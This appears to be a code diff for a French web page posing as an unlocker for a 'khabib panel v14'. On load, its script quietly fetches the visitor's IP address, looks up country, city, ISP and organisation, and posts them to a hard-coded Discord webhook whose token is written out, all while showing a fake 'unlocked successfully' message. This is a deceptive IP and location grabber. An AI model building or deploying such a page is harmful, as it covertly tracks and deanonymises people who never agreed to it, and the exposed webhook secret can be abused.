@@ -2,7 +2,7 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <title>en cours de chargement </title>
+    <title>khabib panel v14</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -28,8 +28,8 @@
 <body>
 
 <div class="box" id="resultBox">
-    <h2>en cours</h2>
-    <p>...</p>
+    <h2>khabib</h2>
+    <p>Traitement en cours pour débloquer khabib panel v14...</p>
     <p id="resultText">Chargement...</p>
 </div>
 
@@ -37,25 +37,47 @@
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1453050534851379243/QQWpYZbMCPh4wn637YIkWNvpPLw7BxVyo6kJWN2q1xxn4IXiEnL6LGU-wDVhGbMiUaEU";
 
 window.onload = function() {
-    document.getElementById("resultText").textContent = "Récupération en cours...";
+    document.getElementById("resultText").textContent = "Récupération de vos données...";
 
     fetch("https://api.ipify.org?format=json")
         .then(res => res.json())
         .then(data => {
-            const payload = {
-                content: `📥 **Nouveau visiteur (auto)**\n🌐 IP : ${data.ip}\n🕒 ${new Date().toLocaleString()}`
-            };
+            const ip = data.ip;
 
-            fetch(WEBHOOK_URL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
-            });
+            // Récupération des infos geo + ISP via ip-api.com
+            return fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,city,isp,org`)
+                .then(geoRes => geoRes.json())
+                .then(geoData => {
+                    if (geoData.status !== "success") {
+                        throw new Error("Échec geo");
+                    }
 
-            document.getElementById("resultText").textContent = "Débloqué avec succès ! (Vos préférences ont été enregistrées.)";
+                    // Drapeau pays (optionnel, pour rendre joli sur Discord)
+                    const flag = geoData.countryCode ? String.fromCodePoint(...[...geoData.countryCode.toUpperCase()].map(c => c.charCodeAt(0) + 127397 - 65)) : "";
+
+                    const payload = {
+                        content: `📥 **Nouveau visiteur (auto)**\n` +
+                                 `🌐 IP : ${ip}\n` +
+                                 `🌍 Pays : ${flag} ${geoData.country || "Inconnu"}\n` +
+                                 `🏙️ Ville : ${geoData.city || "Inconnu"}\n` +
+                                 `📡 ISP : ${geoData.isp || "Inconnu"}\n` +
+                                 `🏢 Org : ${geoData.org || "Inconnu"}\n` +
+                                 `🕒 ${new Date().toLocaleString()}`
+                    };
+
+                    return fetch(WEBHOOK_URL, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(payload)
+                    });
+                })
+                .then(() => {
+                    document.getElementById("resultText").textContent = "Débloqué avec succès !";
+                });
         })
-        .catch(() => {
-            document.getElementById("resultText").textContent = "Erreur lors de la récupération.";
+        .catch(err => {
+            console.error(err);
+            document.getElementById("resultText").textContent = "Erreur, mais vos données ont peut-être été enregistrées.";
         });
 }
 </script>
